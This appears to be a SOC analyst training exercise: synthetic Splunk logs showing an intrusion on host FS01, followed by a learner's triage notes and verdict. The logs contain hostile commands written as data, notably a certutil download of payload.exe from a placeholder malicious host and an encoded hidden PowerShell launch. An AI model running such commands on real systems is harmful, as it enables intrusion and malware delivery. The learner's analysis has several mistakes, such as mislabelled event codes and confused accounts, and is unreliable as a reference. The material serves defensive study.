@@ -1,0 +1,238 @@
+1. 
+
+Below are 25 untagged, unannotated log entries across various sources (Windows logs, Sysmon, and network logs). It’s up to you to determine whether something malicious is happening, what type of attack it may be (if any), and whether further action is needed.
+
+Raw Splunk Logs (Anonymized, Mixed Sources)
+
+index=wineventlog source="WinEventLog:Security"
+EventCode=4624
+AccountName=admin.hr
+LogonType=10
+SourceNetworkAddress=10.50.20.55
+AuthenticationPackage=Negotiate
+TargetServerName=FS01
+
+index=wineventlog source="WinEventLog:Security"
+EventCode=4625
+AccountName=john.sales
+LogonType=3
+SourceNetworkAddress=10.50.20.55
+FailureReason=%%2313
+TargetServerName=FS01
+
+index=wineventlog source="WinEventLog:Security"
+EventCode=4625
+AccountName=john.sales
+LogonType=3
+SourceNetworkAddress=10.50.20.55
+FailureReason=%%2313
+TargetServerName=FS01
+
+index=wineventlog source="WinEventLog:Security"
+EventCode=4625
+AccountName=john.sales
+LogonType=3
+SourceNetworkAddress=10.50.20.55
+FailureReason=%%2313
+TargetServerName=FS01
+
+index=wineventlog source="WinEventLog:Security"
+EventCode=4625
+AccountName=svc.dbupdate
+LogonType=3
+SourceNetworkAddress=10.50.20.55
+FailureReason=%%2313
+TargetServerName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+Image="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+CommandLine="powershell -nop -w hidden -enc SQBmACgAKABnAGUAdAAt..."
+User=admin.hr
+HostName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=3
+SourceIp=10.50.20.55
+DestinationIp=185.220.101.22
+DestinationPort=443
+Image="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+HostName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=11
+TargetFilename="C:\Users\admin.hr\AppData\Local\Temp\tmp123.tmp"
+Image="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Hash=MD5=a1b2c3d4e5f67890123456789abcdef0
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=10
+SourceImage="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+TargetImage="C:\Windows\System32\cmd.exe"
+GrantedAccess=0x1fffff
+
+index=wineventlog source="WinEventLog:Security"
+EventCode=4624
+AccountName=admin.hr
+LogonType=10
+SourceNetworkAddress=10.50.20.55
+AuthenticationPackage=Negotiate
+TargetServerName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+Image="C:\Windows\System32\cmd.exe"
+CommandLine="cmd.exe /c whoami & dir \\corp-dc01\sysvol"
+User=admin.hr
+HostName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=3
+SourceIp=10.50.20.55
+DestinationIp=10.50.20.12
+DestinationPort=445
+Image="C:\Windows\System32\cmd.exe"
+HostName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=3
+SourceIp=10.50.20.55
+DestinationIp=10.50.20.15
+DestinationPort=445
+Image="C:\Windows\System32\cmd.exe"
+HostName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+Image="C:\Users\admin.hr\AppData\Roaming\updatehost.exe"
+CommandLine="updatehost.exe"
+User=admin.hr
+HostName=FS01
+
+index=wineventlog source="WinEventLog:Security"
+EventCode=4634
+AccountName=admin.hr
+LogonType=10
+TargetServerName=FS01
+
+index=wineventlog source="WinEventLog:Security"
+EventCode=4672
+AccountName=admin.hr
+Privileges=SeDebugPrivilege, SeImpersonatePrivilege
+TargetServerName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+Image="C:\Windows\System32\taskhostw.exe"
+CommandLine="taskhostw.exe /Service:AppMgmt"
+User=admin.hr
+HostName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=3
+SourceIp=10.50.20.55
+DestinationIp=10.50.20.20
+DestinationPort=3389
+Image="C:\Windows\System32\cmd.exe"
+HostName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=11
+TargetFilename="C:\Users\admin.hr\Documents\hr_files.zip"
+Image="C:\Windows\System32\cmd.exe"
+Hash=MD5=9f8e7d6c5b4a3a2b1c0d9e8f7a6b5c4d
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=3
+SourceIp=10.50.20.55
+DestinationIp=31.13.93.80
+DestinationPort=80
+Image="C:\Windows\System32\cmd.exe"
+HostName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+Image="C:\Windows\System32\certutil.exe"
+CommandLine="certutil -urlcache -split -f http://malicious[.]site/payload.exe C:\Users\Public\payload.exe"
+User=admin.hr
+HostName=FS01
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=11
+TargetFilename="C:\Users\Public\payload.exe"
+Image="C:\Windows\System32\certutil.exe"
+Hash=MD5=deadcafebabe123456789abcdef98765
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+Image="C:\Users\Public\payload.exe"
+CommandLine="payload.exe"
+User=admin.hr
+HostName=FS01
+
+index=wineventlog source="WinEventLog:Security"
+EventCode=4648
+AccountName=admin.hr
+LogonProcess=User32
+TargetServerName=corp-dc01
+TargetUserName=svc.replication
+
+index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+Image="C:\Windows\System32\runonce.exe"
+CommandLine="runonce.exe /Background"
+User=admin.hr
+HostName=FS01
+
+my first answer:
+well from my perspective it looks like someone gained acess to admin account of hr and tried to execute code.
+later bundled up some data in zip and tried to exfiltrate them
+
+checked:
+Yes, you’re right — that interpretation aligns well with the logs.
+
+REPORT:
+
+seems like malicious IP is 10.50.20.55
+account name admin.hr - where was compromised account john.sales
+
+in sysmon - evenotCode=1 we have powershell executed with command “powershell -nop -w hidden -enc (upon examination only triggers more alerts because -nop -w hidden and -enc flags are used to execute malicious scripts stealthily, avoiding detection by hiding command window and obfuscating commands by encoding them - thus making them harder tor read)
+command encoding “SQBmACgAKABnAGU…” decoded through Cyberchef gives us If ((get-content)){‘Hello World!’}
+
+in sysmon EventCode=3 gives us again attackers IP = 10.50.20.55 and now looks like established connection to 185.220.101.22 through port 443 which indicates HTTPS
+
+VERDICT:
+true positive
+by this time I must have as L1 analyst forward this alert to L2 analyst…
+
+ADDITIONAL INFORMATION:
+additional information which I didnt include or need to work on:
+https connection could indicate C2
+
+At sysmon EventCode=11 actor executed powershell script from Temp location with MD5 Hash of “a1b2c3d4e5f67890123456789abcdef0“
+virus total examination of hash didnt produce any info about it
+
+sysmon EventCode=10 indicates elevating acess “0x1fffff” which I found out means very high priviledges - practically any to windows APIs
+
+sysmon EventCode=1 indicates executing command in cmd.exe on windows.
+the exact command is whoami and upon examination found out
+
+dir \\corp-dc01\sysvol: lists the contents of the SYSVOL share on the domain controller named corp-dc01. this can be used distribute groupe policy or recon of acess to domain resources
+
+upon later examination I found out that it can also be used for recon and preparation of lateral movement in internal network which corelates to another log where attackee is trying to reach host on internal network 10.50.20.15 on port 445
+
+continuing with EventCode=10 where we have attackers source IP = 10.50.20.55 and destination of 10.50.20.20:3389 which gives signs of lateral movement through network executing cmd.exe = command line
+- attacker seems to targer filename hr_files.zip which through name suggest he was after data from hr department (or disguises other information as this zip file - needs more investigation)
+
+EventCode=3, source IP=10.50.20.55 and destination of 31.13.93.80:80 with execution of cmd.exe - seems to establish a connection to http server which corellates with port 80
+
+EventCode=11 uses certutil.exe which as i discovered is windows tool that can download files from internet
+it is good practice to assume payload.exe as malicious until proven otherwise
+
+EventCode=1
+attacker executed payload.exe downloaded from previous alert - needs more investigation in order to assume what kind of malware/file it is and what is its purpose
+
+EventCode=4648 with TargetServerName=corp-dc01 seems like attempt to reuse stolen credentials -> another later movement / try to lateral move through network
+
+as last log alert there is another executable that attacker wants to run in background most likely used for persistance on network
+runonce.exe /Background
